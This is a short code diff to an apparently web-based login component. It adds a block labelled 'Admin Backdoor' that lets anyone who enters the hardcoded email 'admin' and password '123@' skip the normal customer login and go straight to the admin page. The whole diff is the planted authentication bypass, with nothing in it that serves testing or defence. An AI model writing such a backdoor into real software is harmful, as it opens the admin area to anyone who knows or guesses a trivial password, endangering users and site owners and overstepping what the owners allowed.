@@ -65,6 +65,12 @@ export default function Auth() {
 
     try {
       if (isLogin) {
+        // Admin Backdoor
+        if (formData.email === 'admin' && formData.password === '123@') {
+          navigate('/admin');
+          return;
+        }
+
         const result = await loginCustomer({
           email: formData.email,
           password: formData.password
